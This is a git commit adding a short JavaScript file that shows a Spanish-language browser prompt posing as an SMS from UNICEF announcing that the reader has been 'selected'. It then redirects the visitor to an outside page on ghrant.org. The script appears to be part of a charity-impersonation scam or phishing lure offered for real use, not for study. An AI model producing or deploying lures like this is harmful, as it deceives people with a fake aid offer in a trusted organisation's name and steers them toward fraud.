a83d71d7c7373e62a3e30372b3bcceee35f15a03
mfednewblog8 <nsikakimoh68@gmail.com>
2025-10-10 07:58:26 +0100

    Create unicef-spactive.js

---
+++ unicef-spactive.js
@@ -0,0 +1,5 @@
+var password = 'APLICAR '
+password=prompt('SMS: Enhorabuena, estás entre los seleccionados por UNICEF, haz clic en Aceptar para enviar tu solicitud ahora. ','APLICAR ');
+if (password != 'APLICAR ') {
+location.href='https://ghrant.org/unicef-sp.html';
+}
